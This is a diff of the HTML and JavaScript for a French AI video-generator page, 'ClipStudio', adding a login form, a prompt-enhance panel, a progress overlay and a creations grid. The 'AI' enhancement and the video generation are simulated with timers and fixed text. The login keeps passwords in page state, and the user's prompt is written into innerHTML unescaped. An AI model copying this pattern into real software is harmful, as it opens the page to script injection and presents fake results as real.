-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
-                    <div class="btn-spinner" id="btnSpinner"></div>
-                </button>
+            <div class="result-actions">
+                <button id="downloadBtn" class="btn btn-primary">↓ Télécharger</button>
+                <button id="regenerateBtn" class="btn btn-secondary">Régénérer</button>
+                <button id="variantBtn" class="btn btn-secondary">Variante</button>
+                <button id="shareBtn" class="btn btn-secondary">Partager</button>
             </div>
         </div>
-    </section>
+    </div>
 
-    <!-- My Creations -->
-    <section class="creations" id="creations">
-        <h2 class="section-title">Mes créations</h2>
-        <p class="section-subtitle">Vos vidéos générées</p>
-        <div class="creations-grid" id="creationsGrid">
-            <div class="creations-empty">
-                <div class="empty-icon">🎬</div>
-                <div class="empty-text">Vous n'avez encore créé aucune vidéo.</div>
-                <p style="font-size: 12px; color: var(--text-dim);">Votre première création commence ci-dessus</p>
+    <!-- ENHANCE PANEL -->
+    <div id="enhancePanel" class="enhance-panel">
+        <div class="enhance-content">
+            <h2>Amélioration du prompt</h2>
+            <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 16px;">
+                L'IA améliore votre description pour plus de détails cinématographiques
+            </p>
+            <div id="enhanceResult" class="enhance-result">
+                <textarea id="enhancedPrompt" readonly></textarea>
+            </div>
+            <div id="enhanceActions" class="enhance-actions">
+                <button id="enhanceReject" class="enhance-reject">Annuler</button>
+                <button id="enhanceAccept" class="enhance-accept">Appliquer</button>
             </div>
         </div>
-    </section>
+    </div>
 
-    <!-- Community Inspiration -->
-    <section class="inspiration" id="inspiration">
-        <div class="inspiration-content">
-            <h2 class="section-title">Inspirations de la communauté</h2>
-            <p class="section-subtitle">Découvrez ce que d'autres créateurs ont imaginé</p>
-            <div class="inspiration-grid">
-                <div class="inspiration-card" data-prompt="Un paysage futuriste cyberpunk la nuit, néons roses et violets se reflétant sur une route mouillée, caméra travelling, cinématographique">
-                    <div class="inspiration-thumb">
-                        <div class="inspiration-gradient"></div>
-                        <div class="inspiration-pattern"></div>
-                        <button class="inspiration-play" type="button" aria-label="Lire">
-                            <svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5
+    <!-- CREATIONS SECTION -->
+    <div class="container page-section">
+        <div class="section-header">
+            <h2>Vos créations</h2>
+            <p>Consultez vos vidéos générées précédemment</p>
+        </div>
+        <div id="creationsGrid" class="creations-grid"></div>
+    </div>
+
+    <!-- TOAST NOTIFICATION -->
+    <div id="toastContainer" class="toast-container"></div>
+
+    <script>
+        // ===== STATE MANAGEMENT =====
+        const state = {
+            user: {
+                username: null,
+                email: null,
+                emailPassword: null,
+                password: null,
+                connectedAt: null
+            },
+            currentDuration: 5,
+            currentStyle: 'cinéma',
+            currentResolution: '1080',
+            currentRatio: '9:16',
+            creations: []
+        };
+
+        // ===== LOGIN HANDLING =====
+        const loginScreen = document.querySelector('.login-screen');
+        const loginForm = document.getElementById('loginForm');
+        const promptInput = document.getElementById('promptInput');
+
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const username = document.getElementById('loginUsername').value;
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+
+            if (username && email && password) {
+                state.user = {
+                    username,
+                    email,
+                    emailPassword: email,
+                    password,
+                    connectedAt: new Date().toLocaleTimeString('fr-FR')
+                };
+                loginScreen.classList.add('hidden');
+                document.getElementById('navAvatar').textContent = username.charAt(0).toUpperCase();
+                showToast(`Bienvenue ${username}`);
+                promptInput.focus();
+            }
+        });
+
+        // ===== OPTION BUTTONS =====
+        document.querySelectorAll('.option-btn').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                e.preventDefault();
+                const option = btn.dataset.option;
+                const value = btn.dataset.value;
+
+                document.querySelectorAll(`[data-option="${option}"]`).forEach(b => {
+                    b.classList.remove('active');
+                });
+                btn.classList.add('active');
+
+                if (option === 'duration') state.currentDuration = parseInt(value);
+                else if (option === 'style') state.currentStyle = value;
+                else if (option === 'resolution') state.currentResolution = value;
+                else if (option === 'ratio') state.currentRatio = value;
+            });
+        });
+
+        // ===== PROMPT INPUT =====
+        promptInput.addEventListener('input', () => {
+            const count = Math.min(promptInput.value.length, 500);
+            document.getElementById('charCount').textContent = count;
+            document.getElementById('generateBtn').disabled = count === 0;
+        });
+
+        // ===== TOAST NOTIFICATIONS =====
+        function showToast(message) {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.textContent = message;
+            container.appendChild(toast);
+
+            setTimeout(() => {
+                toast.classList.add('show');
+            }, 10);
+
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+        // ===== COST CALCULATION =====
+        function updateCostDisplay() {
+            const costs = {
+                '5': 5, '10': 10, '15': 15, '30': 30,
+                '720': 1, '1080': 2, '1440': 3, '4k': 4
+            };
+            let cost = (costs[state.currentDuration] || 5) * (costs[state.currentResolution] || 1);
+            cost = Math.max(5, cost);
+        }
+
+        // ===== ENHANCEMENT =====
+        const enhanceBtn = document.getElementById('enhanceBtn');
+        const enhancePanel = document.getElementById('enhancePanel');
+        const enhancedPrompt = document.getElementById('enhancedPrompt');
+
+        enhanceBtn.addEventListener('click', async () => {
+            if (!promptInput.value.trim()) {
+                showToast('Entrez d\'abord votre idée');
+                return;
+            }
+            enhancePanel.classList.add('active');
+            document.getElementById('enhanceResult').style.display = 'none';
+            document.getElementById('enhanceActions').style.display = 'none';
+
+            await new Promise(r => setTimeout(r, 2000));
+            const enhanced = promptInput.value + 
+                ` avec une cinématographie professionnelle, éclairage cinématographique réaliste, profondeur de champ dynamique, couleurs vibrantes, détails ultra-précis`;
+            
+            enhancedPrompt.value = enhanced;
+            document.getElementById('enhanceResult').style.display = 'block';
+            document.getElementById('enhanceActions').style.display = 'flex';
+        });
+
+        document.getElementById('enhanceReject').addEventListener('click', () => {
+            enhancePanel.classList.remove('active');
+            showToast('Prompt non modifié');
+        });
+
+        document.getElementById('enhanceAccept').addEventListener('click', () => {
+            promptInput.value = enhancedPrompt.value;
+            document.getElementById('charCount').textContent = Math.min(enhancedPrompt.value.length, 500);
+            enhancePanel.classList.remove('active');
+            showToast('Prompt amélioré appliqué');
+        });
+
+        // ===== INSPIRATION CARDS =====
+        document.querySelectorAll('.inspiration-card').forEach(card => {
+            card.addEventListener('click', () => {
+                promptInput.value = card.dataset.prompt;
+                document.getElementById('charCount').textContent = card.dataset.prompt.length;
+                document.getElementById('generateBtn').disabled = false;
+                window.scrollTo({ top: document.querySelector('.generator').offsetTop, behavior: 'smooth' });
+                showToast('Prompt chargé');
+            });
+        });
+
+        // ===== GENERATION =====
+        const generateBtn = document.getElementById('generateBtn');
+        const generationOverlay = document.getElementById('generationOverlay');
+        const resultOverlay = document.getElementById('resultOverlay');
+        const progressFill = document.getElementById('progressFill');
+        const progressPercent = document.getElementById('progressPercent');
+
+        generateBtn.addEventListener('click', async () => {
+            if (!promptInput.value.trim()) {
+                showToast('Décrivez votre vidéo');
+                return;
+            }
+
+            generateBtn.disabled = true;
+            document.getElementById('btnSpinner').style.display = 'block';
+            generationOverlay.classList.add('active');
+
+            const circumference = 2 * Math.PI * 80;
+            const steps = [
+                { icon: 1, text: 'Analyse du prompt…', duration: 0.2 },
+                { icon: 2, text: 'Génération des images…', duration: 0.4 },
+                { icon: 3, text: 'Animation vidéo…', duration: 0.7 },
+                { icon: 4, text: 'Finalisation…', duration: 1.0 }
+            ];
+
+            for (let i = 0; i <= 100; i++) {
+                const progress = i / 100;
+                const offset = circumference - progress * circumference;
+                progressFill.style.strokeDashoffset = offset;
+                progressPercent.textContent = i + '%';
+
+                const currentStep = Math.floor(progress * steps.length);
+                steps.forEach((step, idx) => {
+                    const stepEl = document.getElementById(`step${step.icon}`);
+                    if (idx < currentStep) {
+                        stepEl.className = 'step-icon done';
+                        stepEl.textContent = '✓';
+                    } else if (idx === currentStep) {
+                        stepEl.className = 'step-icon active';
+                        stepEl.textContent = '◐';
+                    } else {
+                        stepEl.className = 'step-icon pending';
+                        stepEl.textContent = '○';
+                    }
+                });
+
+                await new Promise(r => setTimeout(r, 60 + Math.random() * 40));
+            }
+
+            generationOverlay.classList.remove('active');
+            resultOverlay.classList.add('active');
+
+            document.getElementById('tagDuration').textContent = `⏱️ ${state.currentDuration}s`;
+            document.getElementById('tagStyle').textContent = `🎨 ${state.currentStyle.charAt(0).toUpperCase() + state.currentStyle.slice(1)}`;
+            document.getElementById('tagResolution').textContent = `📐 ${state.currentResolution}p`;
+            document.getElementById('tagRatio').textContent = `🖥️ ${state.currentRatio}`;
+            document.getElementById('resultPromptDisplay').textContent = `"${promptInput.value}"`;
+
+            const newCreation = {
+                id: Date.now(),
+                prompt: promptInput.value,
+                duration: state.currentDuration,
+                style: state.currentStyle,
+                resolution: state.currentResolution,
+                ratio: state.currentRatio,
+                created: new Date().toLocaleDateString('fr-FR')
+            };
+            state.creations.unshift(newCreation);
+            updateCreationsGrid();
+
+            generateBtn.disabled = false;
+            document.getElementById('btnSpinner').style.display = 'none';
+        });
+
+        // ===== RESULT ACTIONS =====
+        document.getElementById('resultPlay').addEventListener('click', () => showToast('Lecture de la vidéo'));
+        document.getElementById('downloadBtn').addEventListener('click', () => showToast('Téléchargement en cours…'));
+        document.getElementById('regenerateBtn').addEventListener('click', () => {
+            resultOverlay.classList.remove('active');
+            generateBtn.click();
+        });
+        document.getElementById('variantBtn').addEventListener('click', () => showToast('Création d\'une variante…'));
+        document.getElementById('shareBtn').addEventListener('click', () => showToast('Lien de partage copié'));
+
+        // ===== CREATIONS GRID =====
+        function updateCreationsGrid() {
+            const grid = document.getElementById('creationsGrid');
+            if (state.creations.length === 0) {
+                grid.innerHTML = `<div class="creations-empty">
+                    <div class="empty-icon">🎬</div>
+                    <div class="empty-text">Vous n'avez encore créé aucune vidéo.</div>
+                    <p style="font-size: 12px; color: var(--text-dim);">Votre première création commence ci-dessus</p>
+                </div>`;
+                return;
+            }
+            grid.innerHTML = state.creations.map(c => `
+                <div class="creation-card">
+                    <div class="creation-thumb">
+                        <button class="creation-play" type="button" aria-label="Lire">
+                            <svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                        </button>
+                    </div>
+                    <div class="creation-meta">
+                        <h4>${c.prompt.substring(0, 30)}…</h4>
+                        <span>${c.duration}s • ${c.style} • ${c.created}</span>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // ===== INITIALIZE =====
+        updateCostDisplay();
+        updateCreationsGrid();
+        showToast('ClipStudio prêt • Connectez-vous pour commencer');
+
+        // ===== USER INFO PANEL =====
+        const navAvatar = document.getElementById('navAvatar');
+        const userInfoPanel = document.getElementById('userInfoPanel');
+        const closeUserPanel = document.getElementById('closeUserPanel');
+        const logoutBtn = document.getElementById('logoutBtn');
+
+        navAvatar.addEventListener('click', () => {
+            if (state.user.username) {
+                userInfoPanel.style.display = userInfoPanel.style.display === 'none' ? 'block' : 'none';
+                if (userInfoPanel.style.display === 'block') {
+                    document.getElementById('infoUsername').textContent = state.user.username;
+                    document.getElementById('infoEmail').textContent = state.user.email;
+                    document.getElementById('infoConnectedAt').textContent = state.user.connectedAt;
+                }
+            }
+        });
+
+        closeUserPanel.addEventListener('click', () => {
+            userInfoPanel.style.display = 'none';
+        });
+
+        logoutBtn.addEventListener('click', () => {
+            state.user = {
+                username: null,
+                email: null,
+                emailPassword: null,
+                password: null,
+                connectedAt: null
+            };
+            userInfoPanel.style.display = 'none';
+            loginScreen.classList.remove('hidden');
+            document.getElementById('navAvatar').textContent = 'S';
+            loginForm.reset();
+            showToast('Déconnexion réussie');
+        });
+
+        // Fermer le panel si on clique en dehors
+        document.addEventListener('click', (e) => {
+            if (!userInfoPanel.contains(e.target) && e.target !== navAvatar) {
+                userInfoPanel.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
